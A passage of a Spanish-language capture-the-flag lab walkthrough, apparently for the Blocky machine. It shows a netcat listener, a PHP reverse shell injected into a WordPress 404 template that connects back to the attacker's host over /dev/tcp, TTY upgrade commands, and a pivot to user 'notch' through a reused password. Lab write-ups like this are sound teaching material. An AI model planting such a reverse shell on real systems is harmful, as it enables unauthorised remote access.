## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Crear una reverse shell desde la 404 Template {-}

Nos ponemos en escucha con el puerto 443.

```bash
nc -nlvp 443
```

Editamos el fichero 404 Template con una reverse shell en php

```php
<?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'");
?>
```

ya podemos ir al url `http://10.10.10.37/?p=404.php` y pa dentro

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### User Pivoting al usuario notch {-}

Miramos si hay reutilisacion de contraseñas 

```bash
su notch 
```

Y con la contraseña encontrada en el ficher `BlockyCore.class` funciona. Y ya podemos ver la flag.